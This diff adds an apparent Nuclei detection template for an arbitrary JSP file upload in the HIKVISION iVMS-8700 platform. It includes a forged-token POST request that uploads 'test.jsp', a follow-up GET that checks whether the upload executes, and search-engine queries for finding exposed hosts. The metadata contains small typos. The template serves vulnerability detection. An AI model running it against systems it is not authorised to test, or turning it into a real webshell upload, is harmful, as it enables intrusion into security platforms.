@@ -1,0 +1,50 @@
+id: HIKVISION
+
+info:
+  name: HHIKVISION iVMS-8700 upload Webshell file
+  author: zerZero Trust Security Attack and Defense Laboratory
+  severity: high
+  description: |
+    HHIKVISION iVMS-8700 Comprehensive Security Management Platfor upload Webshell file
+  metadata:
+    fofa-query: icon_hash="-911494769"
+    hunter-query: web.icon="3670cbb1369332b296ce44a94b7dd685"
+
+
+variables:
+  str0: '{{BaseURL}}/eps/api/resourceOperations/uploadsecretKeyIbuilding'
+
+http:
+  - raw:
+      - |
+        POST /eps/api/resourceOperations/upload?token={{toupper(md5(str0))}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Android 3.2.5; Mobile; rv:51.0) Gecko/51.0 Firefox/51.0
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Length: 184
+        Content-Type: multipart/form-data; boundary=c4155aff43901a8b2a19a4641a5efa15
+
+        --c4155aff43901a8b2a19a4641a5efa15
+        Content-Disposition: form-data; name="fileUploader"; filename="test.jsp"
+        Content-Type: image/jpeg
+
+        {{randstr}}
+        --c4155aff43901a8b2a19a4641a5efa15--
+
+      - |
+        GET /eps/upload/{{name}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: json
+        name: name
+        json:
+          - ".data.resourceUuid"
+        internal: true
+
+    matchers:
+      - type: word
+        words:
+          - '{{randstr}}'
